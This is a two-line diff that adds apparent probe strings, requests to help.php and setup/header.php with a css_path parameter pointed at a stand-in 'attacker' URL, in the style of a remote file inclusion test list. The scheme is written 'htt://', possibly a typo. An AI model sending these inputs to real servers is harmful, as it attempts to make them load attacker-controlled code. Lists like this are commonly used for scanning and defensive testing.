@@ -1,0 +1,2 @@
+help.php?css_path=htt://attacker
+setup/header.php?css_path=htt://attacker
